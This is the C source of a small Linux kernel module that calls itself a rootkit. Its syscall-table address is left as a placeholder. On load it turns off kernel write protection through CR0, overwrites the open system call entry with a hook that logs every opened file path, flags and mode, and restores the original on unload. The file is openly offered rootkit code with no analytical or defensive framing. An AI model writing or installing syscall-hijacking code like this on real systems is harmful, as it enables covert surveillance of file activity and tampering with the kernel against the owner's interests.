#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/version.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <asm/page.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alexandre Frizac");
MODULE_DESCRIPTION("A module for replacing system call");

asmlinkage int (* orig_open) (const char *pathname, int flags, mode_t mode) = NULL;
unsigned long *syscall_table = (unsigned long *)JE_SUIS_UN_SYSCALL_A_CHANGER;

asmlinkage int new_open(const char *pathname, int flags, mode_t mode)
{
  printk("FILE_opened : %s -- Flags (%d) -- Mode (%d)\n", pathname, flags, mode);
  return (orig_open(pathname, flags, mode));
}

static int __init my_init_module(void)
{
  printk("Rootkit launched !\n");
  
  orig_open = (void *)syscall_table[__NR_open];
  write_cr0(read_cr0() & (~ 0x10000));
  syscall_table[__NR_open] = &new_open;
  write_cr0(read_cr0() | 0x10000);
  return (0);
}

static void    my_exit_module(void)
{
  write_cr0(read_cr0() & (~ 0x10000));
  syscall_table[__NR_open] = orig_open;
  write_cr0(read_cr0() | 0x10000);
  pr_info("Rootkit exit\n");
}


module_init(my_init_module);
module_exit(my_exit_module);
